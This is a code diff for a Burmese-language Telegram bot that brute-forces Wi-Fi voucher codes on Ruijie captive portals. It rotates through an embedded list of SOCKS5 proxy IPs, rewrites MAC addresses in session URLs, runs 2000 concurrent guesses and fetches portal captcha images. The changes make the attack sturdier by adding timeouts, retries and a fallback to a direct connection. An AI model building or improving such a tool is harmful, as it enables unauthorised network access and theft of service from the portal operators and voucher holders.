@@ -9,7 +9,6 @@ from datetime import datetime, timezone
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
 
-# ပေးထားသော SOCKS5 Proxy စာရင်းများ
 EMBEDDED_PROXIES = [
     "8.220.141.8:5060", "8.219.5.240:8009", "8.211.194.85:443", "39.104.57.33:8081", "112.5.33.179:999",
     "39.102.208.23:8888", "8.148.23.165:9080", "47.237.2.245:3129", "72.207.109.5:4145", "8.220.204.92:30001",
@@ -104,10 +103,6 @@ success_texts = {}
 limited_texts = {}
 retry_counts = {}
 
-session = None
-_connector = None
-_voucher_sem = None
-
 CONCURRENCY = 2000
 
 def get_random_proxy():
@@ -148,8 +143,8 @@ bot.edit_message_text = safe_edit_message_text
 async def start(message):
     await bot.reply_to(
         message,
-        f"✨ <b>Ruijie Voucher Bot (SOCKS5 Rotating)</b> မှ ကြိုဆိုပါတယ် ဗျာ! ⚡\n\n"
-        f"🌐 <b>Proxy Status:</b> <code>Active ({len(EMBEDDED_PROXIES)} SOCKS5 Proxies Loaded)</code>\n\n"
+        f"✨ <b>Ruijie Voucher Bot (SOCKS5 Robust)</b> မှ ကြိုဆိုပါတယ် ဗျာ! ⚡\n\n"
+        f"🌐 <b>Proxy Status:</b> <code>Active ({len(EMBEDDED_PROXIES)} SOCKS5 Proxies)</code>\n\n"
         "📖 <b>အသုံးပြုနိုင်သော Commands များ:</b>\n"
         "• <code>/input your_wifidog_url</code> - Wifidog Session URL ထည့်ရန်\n"
         "• <code>/scan 6</code> (သို့မဟုတ် <code>7</code>, <code>all</code>) - စကန်ဖတ်ရန်\n"
@@ -164,16 +159,30 @@ async def status_cmd(message):
     active = "အလုပ်လုပ်နေသည် 🟢" if chat_id in scan_tasks else "ရပ်နားထားသည် 🔴"
     await bot.reply_to(
         message,
-        f"📊 <b>လက်ရှိ Bot အခြေအနေ:</b>\n• Status: {active}\n• Active Scans: {len(scan_tasks)}\n• SOCKS5 Proxies: {len(EMBEDDED_PROXIES)} Loaded",
+        f"📊 <b>လက်ရှိ Bot အခြေအနေ:</b>\n• Status: {active}\n• Active Scans: {len(scan_tasks)}",
         parse_mode="HTML"
     )
 
 async def check_session_url(session_url):
-    try:
-        headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+    headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+    # Try multiple proxy attempts with timeout so it never hangs
+    for _ in range(3):
         proxy_str = get_random_proxy()
         connector = ProxyConnector.from_url(proxy_str) if proxy_str else None
-        async with aiohttp.ClientSession(connector=connector) as temp_sess:
+        try:
+            timeout = aiohttp.ClientTimeout(total=5)
+            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as temp_sess:
+                async with temp_sess.get(session_url, allow_redirects=True, headers=headers) as response:
+                    final_url = str(response.url)
+                    body = await response.text()
+                    if "sessionId" in final_url or "sessionId" in body or response.status in (200, 302, 301):
+                        return True
+        except Exception:
+            continue
+    # Fallback to direct connection if all proxies fail
+    try:
+        timeout = aiohttp.ClientTimeout(total=5)
+        async with aiohttp.ClientSession(timeout=timeout) as temp_sess:
             async with temp_sess.get(session_url, allow_redirects=True, headers=headers) as response:
                 final_url = str(response.url)
                 body = await response.text()
@@ -190,12 +199,12 @@ async def handle_input(message):
         return
     url = args[1]
     user_data.setdefault(chat_id, {})
-    await bot.reply_to(message, "🔄 Wifidog Session URL အား SOCKS5 Proxy ဖြင့် စစ်ဆေးနေပါပြီ ⏳...")
+    await bot.reply_to(message, "🔄 Wifidog Session URL အား စစ်ဆေးနေပါပြီ ⏳...")
     if await check_session_url(session_url=url):
         user_data[chat_id]['session_url'] = url
         await bot.reply_to(message, "✅ Session URL အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ 🎉! /scan ဖြင့် စတင်နိုင်ပါပြီ။")
     else:
-        await bot.reply_to(message, "❌ Session URL မှားယွင်းနေပါသည် သို့မဟုတ် သက်တမ်းကုန်သွားပါပြီ။")
+        await bot.reply_to(message, "❌ Session URL မှားယွင်းနေပါသည် သို့မဟုတ် Proxy များ သက်တမ်းကုန်/ချိတ်ဆက်၍ မရပါ။")
 
 @bot.message_handler(commands=['scan'])
 async def scan(message):
@@ -216,7 +225,7 @@ async def scan(message):
         await bot.reply_to(message, "⚠️ စကန်ဖတ်ခြင်း လုပ်ငန်းစဉ်သည် လက်ရှိတွင် အလုပ်လုပ်နေဆဲ ဖြစ်ပါသည်။")
         return
 
-    progress_msg = await safe_send_message(chat_id, "🚀 SOCKS5 Proxy Rotating ဖြင့် စကန်ဖတ်ခြင်း စတင်နေပါပြီ ⚡...")
+    progress_msg = await safe_send_message(chat_id, "🚀 စကန်ဖတ်ခြင်း စတင်နေပါပြီ ⚡...")
     scan_id = str(uuid.uuid4())
     task = asyncio.create_task(
         run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message=message, progress_msg=progress_msg)
@@ -300,7 +309,7 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, prog
         retries = retry_counts.get(chat_id, 0)
         percent = (checked / total) * 100 if total else 0
         bar = ("█" * min(20, int(percent / 5))) + ("░" * (20 - min(20, int(percent / 5))))
-        text = f"🚀 <b>SOCKS5 Proxy Scanning...</b> 🔄\n\n📦 Checked: {checked:,}" + (f"/{total:,}" if total else "") + f"\n⚡ Speed: {speed:,.0f} codes/min\n✅ Found: {found}\n" + (f"[{bar}]" if total else "")
+        text = f"🚀 <b>Scanning...</b> 🔄\n\n📦 Checked: {checked:,}" + (f"/{total:,}" if total else "") + f"\n⚡ Speed: {speed:,.0f} codes/min\n✅ Found: {found}\n" + (f"[{bar}]" if total else "")
         try:
             await safe_edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text, parse_mode="HTML")
         except Exception:
@@ -331,7 +340,8 @@ async def get_session_id(session_url, proxy_str, previous_session_id=None):
     session_url = re.sub(r'(?<=mac=)[^&]+', mac, session_url)
     connector = ProxyConnector.from_url(proxy_str) if proxy_str else None
     try:
-        async with aiohttp.ClientSession(connector=connector) as temp_sess:
+        timeout = aiohttp.ClientTimeout(total=5)
+        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as temp_sess:
             async with temp_sess.get(session_url, allow_redirects=True) as req:
                 match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
                 if match:
@@ -356,7 +366,8 @@ async def perform_check(session_url, code, chat_id, message=None):
             callback_session_id = await get_session_id(session_url, proxy_str)
             if not callback_session_id:
                 return
-            async with aiohttp.ClientSession(connector=connector) as req_sess:
+            timeout = aiohttp.ClientTimeout(total=6)
+            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as req_sess:
                 async with req_sess.get(f'https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={callback_session_id}&_t={time.time()}') as img:
                     img_bytes = await img.read()
                 
